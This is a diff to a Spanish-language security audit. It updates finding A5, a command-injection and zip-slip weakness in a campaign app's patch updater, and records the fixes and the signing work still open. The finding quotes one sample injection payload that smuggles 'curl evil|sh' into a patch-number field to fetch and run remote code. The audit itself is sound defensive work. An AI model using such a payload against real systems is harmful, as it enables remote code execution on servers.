@@ -26,6 +26,7 @@ búsquedas dirigidas. No se ejecutó nada contra la base.
 | **A2** — `schema.sql` desincronizado | 🟨 **PARCIAL** | `3053752` (medición), `4bfbe6a` (5 FK fuera + 3 índices explícitos). Falta: aplanar `schema.sql` con `init-db.js` (A9) |
 | **A26** — `campana_ambito` sin crear | ✅ **RESUELTO** | `4bfbe6a` |
 | **A6** — coste de `GET /estructura` | 🟨 **PARCIAL** | `62eb608` (agregaciones en vez de subconsultas por fila). Paginar se descartó: rompería la jerarquía del frontend |
+| **A5** — actualizador como superficie de ataque | 🟨 **PARCIAL** | `3aa0e82` (inyección de comandos cerrada + validación de zip). Falta: firmar los parches, necesita el Servidor de Licencias |
 | Resto | Sin empezar | — |
 
 **Decisión tomada en A2 — opción «nacer conectada», con una costura.** Se
@@ -174,7 +175,7 @@ escritura de votantes.
 | Severidad | Cantidad | IDs | Abiertos |
 |---|---|---|---|
 | 🔴 Crítica | 1 | A1 | — (resuelto) |
-| 🟠 Alta | 6 | A2, A3, A4, A5, **A25**, **A26** | A4, A5, A25 (A2 parcial) |
+| 🟠 Alta | 6 | A2, A3, A4, A5, **A25**, **A26** | A4, A25 (A2 y A5 parciales) |
 | 🟡 Media | 10 | A6–A15 | A6–A15 (A7bis parcial, A9 de-escalado) |
 | ⚪ Baja | 10 | A16–A24, **A27** | A16–A24, A27 |
 
@@ -237,7 +238,35 @@ actualización, no de una consulta suelta).
 - **Ventana:** neutra (hacerlo ahora es más fácil porque no hay que coordinar
   con clientes en vivo).
 
-### A5 — El actualizador aplica parches sin verificar su origen ni su contenido 🟠 Alta
+### A5 — El actualizador aplica parches sin verificar su origen ni su contenido 🟠 Alta — 🟨 PARCIAL (`3aa0e82`)
+
+> **Al implementarlo apareció algo peor que el zip-slip descrito abajo:
+> INYECCIÓN DE COMANDOS.** `numero_parche` llega en el JSON del Servidor de
+> Licencias y se interpolaba tal cual en una orden de shell
+> (`unzip -o campana-parche${n}.zip`, `scripts/actualizar-automatico.js`).
+> Un valor como `1.zip; curl evil|sh` **se habría ejecutado** en el servidor
+> de cada campaña. No hacía falta ni un zip malicioso: bastaba una respuesta
+> JSON manipulada.
+>
+> **Hecho (mitad receptora, sin tocar el Servidor de Licencias):**
+> las órdenes `unzip` pasan a `execFileSync` con argumentos separados —sin
+> shell que interprete nada—; el número se valida antes de usarse; y el
+> contenido del zip se revisa **antes** de descomprimir, rechazando rutas
+> absolutas, rutas con `..` y **enlaces simbólicos** (el tercer vector, que
+> esquiva a los dos primeros). Ahora **falla cerrado**: antes el listado iba
+> en un `try/catch` que solo avisaba y descomprimía igual, así que un zip
+> ilegible se aplicaba sin revisar.
+>
+> Probado con zips de juguete —travesía, ruta absoluta, enlace simbólico y
+> archivo vacío se rechazan con mensaje legible; uno legítimo y el parche 18
+> real se aceptan— y con 15 casos del validador de número, incluida la carga
+> de inyección.
+>
+> **Falta la otra mitad, y necesita las dos puntas:** firmar el `.zip` en el
+> Servidor de Licencias y verificar la firma aquí. Mientras no exista,
+> **quien controle ese servidor sigue teniendo ejecución de código** en todas
+> las campañas — solo que ahora tiene que lograrlo con un archivo válido, no
+> con una cadena de texto.
 
 - **Archivos:** `scripts/actualizar-automatico.js:96-114` (descarga y
   `unzip -o … -d .`).
